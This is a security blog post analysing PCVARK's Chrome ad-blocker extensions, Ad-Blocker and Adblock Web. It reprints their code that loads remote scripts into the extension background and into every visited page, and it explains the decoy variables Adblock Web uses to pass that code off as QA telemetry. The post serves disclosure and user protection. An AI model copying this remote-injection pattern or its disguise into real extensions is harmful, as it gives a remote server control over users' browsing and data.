---
title: "Introducing PCVARK and their malicious ad blockers"
date: 2023-06-05T14:04:38+0200
description: "The company PCVARK is known for developing “potentially unwanted software.” Chrome Web Store is offering two of their ad blockers regardless, despite having remove another two a year ago."
categories:
- security
- privacy
- add-ons
- google
---

It isn’t news that the overwhelming majority of ad blockers in Chrome Web Store is either outright malicious or [waiting to accumulate users before turning malicious](/2018/04/18/the-ticking-time-bomb-fake-ad-blockers-in-chrome-web-store/). So it wasn’t a surprise that the very first ad blocker I chose semi-randomly (Adblock Web with 700,000 users) turned out malicious. Starting from it, I found another malicious extension (Ad-Blocker, 700,000 users) and two more that have been removed from Chrome Web Store a year ago (BitSafe Adblocker and Adblocker Unlimited).

{{< img src="listing.png" width="600" alt="Chrome Web Store extension listing, in the middle is the entry titled “Adblock Web - Adblocker for Chrome” with the description text “Get rid of any intrusive ads easily and make your web cleaner!”" />}}

All these ad blockers and probably some more were developed by the company PCVARK. According to Malwarebytes Labs, this company [specializes in developing “potentially unwanted programs.”](https://www.malwarebytes.com/blog/news/2016/08/pcvark-plays-dirty) In other words: they show users warnings about alleged compromise, only to push them into installing their software. Once installed, this software will attempt to scare the user into installing more crappy applications and into paying money for fixing the supposed issue.

While PCVARK originally specialized in Mac software, they apparently also discovered pushing malicious ad blockers to Chrome Web Store as a valuable business opportunity. This was encouraged by Google’s lax moderation policies as well an almost complete lack of policy enforcement. While Google eventually managed to remove some extensions, at least two remain despite being obviously related to the removed ones.

{{< toc >}}

## Who is PCVARK?

If you open PCVARK website today, you will see offers for Android applications: MobiClean, which supposedly makes your phone faster, and VOOHOO live, a conferencing platform. The former has already been removed from Play Store. And if I were you, I definitely wouldn’t install the latter.

Back in the day, PCVARK was a notorious distributor of dubious Mac software. Their “Mac File Opener” is [discussed extensively in a Malwarebytes Labs article](https://www.malwarebytes.com/blog/news/2016/08/pcvark-plays-dirty), with the conclusion that it should be classified as malware. It was one of the ways in which users were scammed into installing other PCVARK applications.

One such application is [described by Malwarebytes as follows](https://www.malwarebytes.com/blog/detections/pup-advanced-mac-cleaner):

> PUP.Advanced Mac Cleaner is a system optimizer. These so-called "system optimizers" use intentional false positives to convince users that their systems have problems. Then they try to sell you their software, claiming it will remove these problems.

If you look at an [archived version of their website](https://web.archive.org/web/20170726181938/http://pcvark.com/?override=1) however, by 2017 PCVARK already switched to promoting their Ad-Blocker browser extension prominently on their website. So one can be certain that this extension became a major contributing factor to the company’s revenue. All the more surprising is the fact that Google will still distribute it in the Chrome Web Store.

## Why are there so many malicious ad blockers?

If you search for an ad blocker in Chrome Web Store, you will find literally hundreds of browser extensions. Very few of those are legitimate, to my knowledge: AdBlock, Adblock Plus, AdGuard, uBlock, uBlock Origin. The rest of them typically attempt to attract users with misleadingly similar names and logos. Quite a few were already discovered to be malicious [[1]](https://adguard.com/en/blog/over-20-000-000-of-chrome-users-are-victims-of-fake-ad-blockers.html) [[2]](/2023/05/31/more-malicious-extensions-in-chrome-web-store/)</sup>, others will likely [turn malicious once a sufficient user count is reached](/2018/04/18/the-ticking-time-bomb-fake-ad-blockers-in-chrome-web-store/).

There is a number of factors contributing to this proliferation of malicious ad blockers:

* Ad blockers are an immensely popular browser extension category, with lots of users wanting to install one.
* There is already considerable confusion about the “right” ad blocker, even if you look only at the legitimate ones: is it AdBlock or Adblock Plus? uBlock or uBlock Origin?
* With Adblock Plus, AdGuard and uBlock Origin, there are three high quality open source products than anyone can easily copy to create “their” ad blocker.
* Ad blockers require access to every website in order to do their job, so they will necessarily have wide-reaching privileges. That’s ideal if one wants to abuse privileges.
* Google has traditionally refused to moderate extensions that attempt to hijack the popularity of established brands, taking years to remove even cases of outright trademark violations.
* Google has also been very reluctant to enforce their policies against malicious extensions. Even if a report were acted upon, Google would never search for similar malicious extensions on their own.

Google certainly is aware of this. And if security of their users were a priority, they would be keeping a close eye on these ad blockers. The fact that the Ad-Blocker extension could stay in the Chrome Web Store for more than five years while being very obviously malicious has two possible explanations. Either Google simply doesn’t care, or Chrome Web Store is so understaffed that not even the obvious cases can be caught.

## Showcasing Ad-Blocker

This will get technical now. If that’s not what you are looking for, feel free to jump straight to [conclusions](#conclusions).

Like all ad blockers produced by PCVARK, Ad-Blocker is based on an ancient version of Adblock Plus code, pulled somewhere around 2016. With its latest release being already five years old, it is also very close to the original Adblock Plus code. And it isn’t exactly subtle about what it is up to. The additions to the Adblock Plus code stick out, and there is no obfuscation – the code hasn’t even been minified. Even some code comments in Hindi are still there.

### The exclusion list

The extension contains a hardcoded “exclusion list” which it will update regularly by downloading `http://pro.ad-blocker.org/Json/ExclusionList.txt`. This list currently contains 1647 domains.

{{< img src="exclusionlist.png" width="600" alt="A huge list with domain names like securepcutils.com, winpcbooster.com or syscleantools.com" />}}

Most of these domains are no longer active. Judging by the names however, these domains used to promote PCVARK’s applications.

Obviously, PCVARK wouldn’t want to block any ads on these websites. So their ad blocker extensions disable themselves on those, without any way for the user to override that.

### Giving a remote server full control over the extension

Normally, extension pages can only run code contained within the extension itself. This is ensured by the [default Content Security Policy](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_Security_Policy#default_content_security_policy) applying to these pages.

Extensions can choose to relax this protection however. As does the Ad-Blocker extension:

```json
"content_security_policy": "script-src 'self' https://negbar.ad-blocker.org/
     https://ssl.google-analytics.com; object-src 'self'",
```

This loophole is used by a script called `GlobalNotifierStats.js` which is part of the extension’s background page:

```js
var mf = document.createElement("script");
//mf.type = "text/javascript";
mf.async = true;
mf.src = "https://negbar.ad-blocker.org/chrome/adblocker-chromeimportstats.js";
document.getElementsByTagName("head")[0].appendChild(mf);
```

So this loads the script `https://negbar.ad-blocker.org/chrome/adblocker-chromeimportstats.js` into the extension’s background page, essentially giving it access to all the extension privileges. For reference: the extension has access to each an every website, it can potentially watch over your shoulder as you browse the web, steal information as you enter it or modify website responses in any way it likes.

At the moment, this remote script will merely load Google Analytics for me. It can change any moment however, for all extension users or only the selected few. Which is why [Chrome Web Store policy](https://developer.chrome.com/docs/webstore/cws-dashboard-privacy/#declare-any-remote-code) says:

> Your extension should avoid using remote code except where absolutely necessary.

Well, using Google Analytics can definitely be done without using remote code, in particular without using code from the extensions’s web server as an intermediate.

The policy further says:

> Remote Code: Use this field to tell reviewers whether your extension executes remote code and, if so, why this is necessary.

I wonder whether the developers of Ad-Blocker declared using remote code and, if they did, how they justified that. No, I don’t think they did.

The policy also says:

> Extensions that use remote code will need extra scrutiny, resulting in longer review times.

No, I sincerely doubt that any amount of scrutiny was ever spent on this extension. As I said, it isn’t exactly subtle about what it does.

### Giving a remote server full control over visited websites

The extension also has a very similar script called `GlobalInjectJS.js` which runs as a content script in each visited web page:

```js
var mf = document.createElement("script");
//mf.type = "text/javascript";
mf.async = true;
mf.src = "https://negbar.ad-blocker.org/chrome/adblocker-chromeglobalinjectjs.js";
document.getElementsByTagName("head")[0].appendChild(mf);
```

So this loads the script `https://negbar.ad-blocker.org/chrome/adblocker-chromeglobalinjectjs.js` into each website you visit. Currently, this script is empty for me. But even this way, the `Referer` HTTP header sent along with the script request tells the server which website the user visited. So the `negbar.ad-blocker.org` web server can collect users’ browsing profiles just nicely.

Of course, it’s the same here: this script doesn’t have to stay empty. In fact, this functionality certainly wasn’t added only to load an empty script. It can start serving some malicious code any time, for all extension users or only the selected few.

### The “neg bar”

Are you also wondering what `negbar` in the server’s name stands for? It seems to be misspelled, as an object in the extension’s source code called `showNag` shows. So this is actually about nagging the user. Nagging with what?

This functionality is contained in another content script called `showNeg.js`. It downloads some data from `https://negbar.ad-blocker.org/chrome/adblocker-chrome-shownegJson.txt`. And then it uses a number of factors to decide whether it should display the frame indicated in this data to the user. The factors include not showing the message more than once per day and not injecting it into the extension’s own pages.

Now the data is currently empty for me (something that can obviously change any time). Luckily, the developers left an unused `showNeg()` function in the code, featuring two default addresses for that “nag frame”: `https://adblocker.pcvark.com/downloadProduct.html` and `https://apmserv.pcvark.com/apm_html/v1_1/detectuserapm.html`. The latter even still exists on the web:

{{< img src="nagbar.png" width="645" alt="A message saying: Should Advanced Password Manager remember this password? Next to it two buttons: Save Site and Not Now." />}}

Internet Archive shows that the former page was similar. The message however was: “Your identity is at risk. Download Advanced Password Manager to start safeguarding your identity.” The “Protect now” button would then start downloading a Windows executable.

Various websites describe Advanced Password Manager as “potentially unwanted software” that is being distributed via deceptive methods. [This article](https://www.viruspup.com/rogue/remove-advanced-password-manager.html) goes into more detail: once installed, Advanced Password Manager will perform a scan of the computer and “find” various identity traces. It will then urge you to purchase a premium license in order to remove them. This application is also reported to hijack browser settings such as home and new tab pages as well as the search engine.

### The “privacy policy”

While Chrome Web Store usually requires extension developers to disclose information about their privacy practices (whether truthful or not), Ad-Blocker somehow got away without providing this information. There is only a link to a privacy policy, and it better be a good one given the level of access this extension gives its web server. Here it comes:

{{< img src="privacy_policy.png" width="355" alt="A white page saying “Not Found.”" />}}

Yes, that privacy policy page is gone. The Internet Archive has [a copy of it](http://web.archive.org/web/20221129233440/https://ad-blocker.org/privacypolicy) however. If you look through it, there is some information about the data collected by the website. It also says about the extension:

> It has been built on AdBlock Plus open source code and it maintains GPLv3 terms and conditions.

Spoiler: No, it does not comply with GPLv3 terms and conditions. For that it would need to at least publish the extension’s source code.

It also explains at great length how Ad-Blocker (meaning: PCVARK) is not liable for any damages it might cause. Only one thing is missing: what data the extension collects and how that data is used.

If you go to an older version of the privacy policy from 2019, there is one more paragraph:

>  If you add filter subscriptions to your Ad-Blocker installation, the subscription will be requested to regularly retrieve updates. Every update results in the hosting website receiving your IP address as well as some general information like your Ad-Blocker version, browser and browser version. This data is subject to the privacy policy of the website in question.

That’s a verbatim copy from the Adblock Plus privacy policy. Yet Ad-Blocker is way more privacy-intrusive, and none of its data collection is explained. In fact, even that one small paragraph was apparently too much for PCVARK, so it got removed.

## Showcasing Adblock Web

Unlike Ad-Blocker, Adblock Web is comparably recent with the latest release in December 2022. Its code is minified and further removed from the original Adblock Plus. One can see some effort to develop useful site blocking functionality on top of the original. I don’t want to comment on the quality of that implementation, so let’s just say: there are security vulnerabilities.

There is still the same exclusion list however: 1647 PCVARK-owned domains where ads should never be blocked. And while the extension is supposedly being published by “uadblock Inc,” plenty of code details give it away as another PCVARK product.

More than that: the websites used by the extension show that it is related to BitSafe Adblocker and Adblocker Unlimited. Both extensions were removed from Chrome Web Store a year ago (March and April 2022 respectively), their code closely resembled Adblock Web.

Now one could expect that PCVARK published Adblock Web as a replacement for the extensions that were taken down by Google. This doesn’t appear to be the case however. The Adblock Web extension existed since at least 2021, so it was already in the Chrome Web Store when the takedown happened. There is exactly one explanation how Google could have missed Adblock Web when they took down the other extensions: they didn’t even look.

### Giving a remote server full control over visited websites

Compared to Ad-Blocker, Adblock Web is rather subtle about its malicious functionality. It no longer relaxes the [default Content Security Policy](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_Security_Policy#default_content_security_policy) to load remote code into the extension, this would have been too suspicious. But it still has the capability to inject arbitrary JavaScript code into any website you visit.

For that it loads its configuration from `https://adblock-unlim.com/api/custom-rules/`. If you think that “loads” here means `XMLHttpRequest` or something similar: no, that’s not it. It loads the page in a frame, sends it a message and parses the response as JSON. I can only imagine one reason for this complicated approach: if someone were to open this address in the browser manually, they would only see an unsuspicious blank page.

A content script in the extension then contains the following code working with this configuration (unminified and minimally simplified here):

```js
ext.backgroundPage.sendMessage({ action: "get_qa_rules" }, function (config) {
  var dummy = null;
  var url = "https://adblock-unlim.com/qa_metric/?type=fail&fr=";
  var dummy2 = 0;
  const fallbackUrl = chrome.runtime.getURL("/libs/qa-params-v1.0.1.min.js");
  try {
    if (!config)
      return;
    if (!config.traceUrl || !config.extStat)
      return;
    if (config.rAllow &&
        !new RegExp(config.rAllow[0], config.rAllow[1]).test(location.href))
      return;
    if (config.rDeny) {
      if (new RegExp(config.rDeny[0], config.rDeny[1]).test(location.href))
        return;
      url = "";
      if (config && config.qaParams)
        url = config.qaParams.failPrefix;
    }
    var now = performance.now();
    config.traceUrl;
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.async = true;
    script.src = url ?
        url + "?fr=" + dummy :
        (fallbackUrl.match(/^\/\//) && e.location.protocol, fallbackUrl);
    document.body.appendChild(script);
  }
  catch (error) {
    if (url.match("^https?://"))
      fetch(url + "?ts=" + now + "&te=" + dummy2 + "&ts=" + data.timestamp +
          "&d=" + location.host + "&fr" + error.message);
  }
});
```

Note how the fallbacks here aren’t actually designed to run. The constant `fallbackUrl` will never be used because `e.location.protocol` will throw: `e` is not defined. Similarly with the `catch` block: `data.timestamp` will throw because `data` is not defined. So all these dummy variables never assigned a value are only meant to make this look more like legitimate code. Same with calling `performance.now()`, the result of a single call is meaningless even if it were used.

Note also that this will only run if the config contains `traceUrl` and `extStat` values, yet these values are not actually being used. That’s another detail meant to make this look like some code collecting harmless performance data. In reality these are merely flags activating this functionality.

Note how the URL is supposedly some failure reporting, yet it will be loaded unconditionally if the page address passes `rAllow` and `rDeny` checks. Note also that the script URL will always be overwritten if the `rDeny` regular expression is provided, even if it doesn’t match the current page – logic that doesn’t make any sense.

Finally, the address loaded as script here will produce a PNG image for me. This is again meant to reinforce the impression that this is a mere tracking pixel. Yet nobody would load a tracking pixel as a script, that’s what `<img>` tags are good for. And if everything else fails, the developers are clearly aware of the `fetch()` function.

The obvious conclusion is: this is no QA functionality as it claims to be. The purpose of this code is injecting a remote script into all visited web pages, as soon as the extension receives a configuration enabling this functionality.

### Extracting user’s browsing history

An interesting piece of Adblock Web functionality is its list of “supported” domains that it will regularly download from `https://adblock-unlim.com/api/domains/` (same frame messaging approach as above). It seems to make little sense: this is an ad blocker, *all* domains are supported. There are some hints towards this functionality being meant for video ad blocking, yet that’s a red herring. The extension contains no explicit video ad blocking functionality, and even if it did: calling `isSupportedDomain` to determine which extension icon to show on a site still makes no sense.

So it doesn’t come as a real surprise that all occasions where this list of “supported” domains is used turn out to be no-ops or dead code. In the end, this is only really used to decide whether `loadEasyListForDomain()` should be called. If that check succeeds, the extension will make a request to an address like `https://adblock-unlim.com/api/custom-easylist/?domain=youtube.com`.

If you expected some domain-specific filter rules in the response – nope, the response was always empty for me. Not that it matters because the extension ignores the response. And there is another indicator that this isn’t really about loading filter rules: this request is sent out delayed, five seconds after a tab loads. If this were about ad blocking functionality, this would be way too late.

Instead, this is obviously about learning what websites the user visits. For me, the “supported” domains are four video websites. But this is likely yet another decoy, and the users targeted by this feature get a far more extensive list of domains that PCVARK is interested in.

### The privacy policy

According to the privacy practices stated in the Chrome Web Store, Adblock Web developers declared that user’s data is:

> Not being used or transferred for purposes that are unrelated to the item's core functionality

Given the findings above, I dare to doubt that statement. But let’s have a look at their privacy policy. Unlike Ad-Blocker, Adblock Web actually has one.

> We want to make sure you are aware of our Chrome extension “AdBlocker Unlimited” so that you always see the whole picture of your interaction with us.

Yes, the privacy policy consistently speaks of “AdBlocker Unlimited,” the extension removed from Chrome Web Store a year ago. Let’s ignore that and see what it has to say about data:

> AdBlocker Unlimited does not collect any personal information about you (such as your name, email address, etc.). Further, it does not collect or report back to us (or anyone else) any data regarding your computer keystrokes or other data unrelated to the services the Extension provides

Well, bullshit.

## Conclusions

As we’ve seen, PCVARK is unsurprisingly using their Chrome ad blockers to gain a foothold in your system. The older Ad-Blocker extension does it in more obvious ways, the newer Adblock Web is more subtle. In both cases it’s obvious however that this functionality has nothing to do with ad blocking and everything with granting PCVARK’s servers access to your browsing session.

In the Ad-Blocker extension we’ve seen an example of how this power is used: to inject a message into legitimate web pages “warning” users about alleged risks and urging them to download PCVARK software. This software would then continue showing scary messages until the user payed up.

This is certainly far from being the only way in which PCVARK monetizes users of their ad blockers. The Adblock Web extension shows that PCVARK is also interested in learning which websites you visit. It’s impossible to tell whether the idea here is creating and selling browsing profiles or “merely” learning more about the user to improve the targeting of their scary messages.

In addition, all extensions give the PCVARK servers enormous privileges. I don’t know how these privileges are being used. In theory however, PCVARK could spy on the users as they browse the web, steal whatever data they enter on websites, and maybe even manipulate banking websites to reroute money transfers.

There are numerous articles on the web demonstrating that PCVARK isn’t exactly what you would call an “ethical company.” While they themselves seem to consider their activities legal, it isn’t quite clear where they draw the boundary to illegality.

It’s a shame that Google allows Chrome Web Store to be abused by such actors. Google definitely could have known what these extensions are doing, at the very least when the very similar BitSafe Adblocker and Adblocker Unlimited extensions were removed. Searching for similar software would be the obvious next step after such takedowns – I know for certain that Mozilla does it. Yet it would appear that Google does only the bare minimum to address concerns, and only if these concerns are voiced by someone with a significant reach.
